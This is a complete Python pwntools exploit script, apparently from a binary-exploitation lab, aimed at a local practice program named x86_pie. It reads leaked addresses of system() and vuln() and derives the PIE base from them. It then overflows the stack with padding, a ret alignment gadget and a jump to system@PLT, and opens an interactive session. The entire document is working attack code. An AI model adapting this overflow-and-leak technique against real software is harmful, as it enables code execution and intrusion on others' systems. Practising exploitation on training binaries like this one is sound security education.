from pwn import *


binary = "../x86_binaries/x86_pie"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)

    p.recvline()
else:
    p = elf.process()



### EXPLOIT ###
p.recvline()                                    # id output

system_addr = int(p.readline().strip(),16)
print(f'system(): {hex(system_addr)}')
vuln_addr = int(p.readline().strip(),16)
print(f'vuln(): {hex(vuln_addr)}')
elf.address = vuln_addr - elf.symbols['vuln']   # set exe base address based on leak

call_system_addr = elf.plt['system']

payload = flat(
    b'a'*0x28,                                  # padding
    p64(vuln_addr+53),                          # `ret` gadget for stack alignment
    p64(call_system_addr),                      # system@PLT gadget
)
p.sendline(payload)
p.interactive()